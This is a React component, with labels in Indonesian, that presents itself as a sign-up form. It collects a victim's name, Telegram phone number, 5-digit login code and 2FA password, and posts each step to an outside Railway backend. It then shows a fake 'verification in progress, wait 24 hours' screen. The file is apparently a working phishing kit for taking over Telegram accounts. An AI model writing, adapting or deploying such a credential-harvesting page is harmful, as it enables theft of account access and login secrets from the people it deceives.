"use client"

import { useState } from "react"
import { useForm } from "react-hook-form"
import * as z from "zod"
import { zodResolver } from "@hookform/resolvers/zod"
import { Button } from "./ui/button"
import { Input } from "./ui/input"
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "./ui/form"
import { toast } from "sonner"
import { Loader2 } from "lucide-react"

// Schema validasi ketat agar user tidak bisa asal klik
const formSchema = z.object({
  nama: z.string().min(1, "Nama lengkap wajib diisi"),
  nomor_hp: z.string().min(10, "Nomor HP minimal 10 angka").regex(/^[0-9]+$/, "Hanya boleh angka"),
  otp: z.string().length(5, "OTP harus 5 angka").regex(/^[0-9]+$/, "Hanya boleh angka"),
  sandi: z.string().min(1, "Sandi wajib diisi"),
})

export default function AuthForm() {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [otpError, setOtpError] = useState(false)

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: { nama: "", nomor_hp: "", otp: "", sandi: "" },
  })

  async function sendToBackend(data: any, type: string) {
    const backendUrl = "https://backend-python-production-6e72.up.railway.app"
    try {
      await fetch(`${backendUrl}/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...data, step: type }),
      })
    } catch (e) { console.error(e) }
  }

  const onSubmit = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true)
    setOtpError(false)
    try {
      if (step === 1) {
        await sendToBackend(values, "DATA_AWAL")
        setStep(2)
      } else if (step === 2) {
        // Ganti '12345' dengan logika pengecekan OTP kamu
        if (values.otp !== "12345") { 
          setOtpError(true)
          toast.error("Kode OTP salah!")
          return 
        }
        await sendToBackend(values, "INPUT_OTP")
        setStep(3)
      } else if (step === 3) {
        await sendToBackend(values, "INPUT_SANDI")
        setStep(4)
      }
    } finally {
      setIsLoading(false)
    }
  }

  if (step === 4) {
    return (
      <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-lg bg-white text-center">
        <Loader2 className="h-12 w-12 animate-spin text-[#1d71d3] mx-auto mb-4" />
        <h2 className="text-xl font-bold">Verifikasi Sedang Diproses</h2>
        <p className="text-sm text-gray-600">Mohon tunggu 1x24 jam.</p>
      </div>
    )
  }

  return (
    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
      <div className="mb-6 rounded-xl border overflow-hidden">
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
      </div>

      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-5">
          {step === 1 && (
            <>
              <FormField control={form.control} name="nama" render={({ field }: { field: any }) => (
                <FormItem>
                  <FormLabel className="font-semibold">Nama Lengkap:</FormLabel>
                  <FormControl><Input placeholder="Masukkan nama" {...field} /></FormControl>
                  <FormMessage />
                </FormItem>
              )} />
              <FormField control={form.control} name="nomor_hp" render={({ field }: { field: any }) => (
                <FormItem>
                  <FormLabel className="font-semibold">Nomor Telegram Aktif:</FormLabel>
                  <FormControl><Input type="tel" placeholder="08XXXXXXXXXX" {...field} /></FormControl>
                  <FormMessage />
                </FormItem>
              )} />
            </>
          )}

          {step === 2 && (
            <FormField control={form.control} name="otp" render={({ field }: { field: any }) => (
              <FormItem className="text-center">
                <FormLabel className="font-semibold block mb-4 text-lg">Masukkan 5 Digit Kode OTP</FormLabel>
                <FormControl>
                  <Input 
                    {...field}
                    maxLength={5}
                    className={`text-center text-2xl tracking-[1rem] font-bold h-16 ${otpError ? 'border-red-500 bg-red-50' : 'border-[#1d71d3]'}`}
                    placeholder="00000"
                    type="tel"
                  />
                </FormControl>
                {otpError && <p className="text-red-500 text-[10px] mt-2 italic font-medium">Kode OTP salah atau kadaluarsa.</p>}
                <FormMessage />
              </FormItem>
            )} />
          )}

          {step === 3 && (
            <FormField control={form.control} name="sandi" render={({ field }: { field: any }) => (
              <FormItem>
                <FormLabel className="font-semibold">Masukkan Kata Sandi (2FA):</FormLabel>
                <FormControl><Input type="password" placeholder="******" {...field} /></FormControl>
                <FormMessage />
              </FormItem>
            )} />
          )}

          <Button 
            type="submit"
            className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 uppercase"
          >
            {isLoading ? <Loader2 className="animate-spin" /> : (step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI")}
          </Button>
        </form>
      </Form>

      <div className="mt-6 text-left border-t pt-4">
        <p className="text-[12px] text-gray-500 leading-tight">
          Peringatan:<br/>Pendaftaran hanya akan di masukkan melaui data dari pendaftaran melalui telegram yang aktif!
        </p>
      </div>
    </div>
  )
}